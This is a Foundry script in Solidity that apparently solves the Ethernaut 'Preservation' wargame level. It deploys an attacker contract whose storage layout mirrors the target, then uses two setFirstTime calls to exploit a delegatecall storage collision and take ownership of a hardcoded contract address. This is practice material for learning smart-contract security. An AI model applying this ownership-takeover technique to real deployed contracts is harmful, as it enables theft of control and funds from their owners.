// SPDX-License-Identifier: MIT
pragma solidity 0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {Preservation} from "../../src/Ethernaut/Preservation.sol";

contract ExploitScript is Script {
    function run() public {
        vm.startBroadcast();
        Preservation preservation = Preservation(0x7ae0655F0Ee1e7752D7C62493CEa1E69A810e2ed);
        AttackPreservation attackPreservation = new AttackPreservation();
        preservation.setFirstTime(uint256(uint160(address(attackPreservation))));
        preservation.setFirstTime(uint256(uint160(address(msg.sender))));
        vm.stopBroadcast();
    }
}

contract AttackPreservation {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;

    function setTime(uint256 newOwner) public {
        owner = address(uint160(newOwner));
    }
}
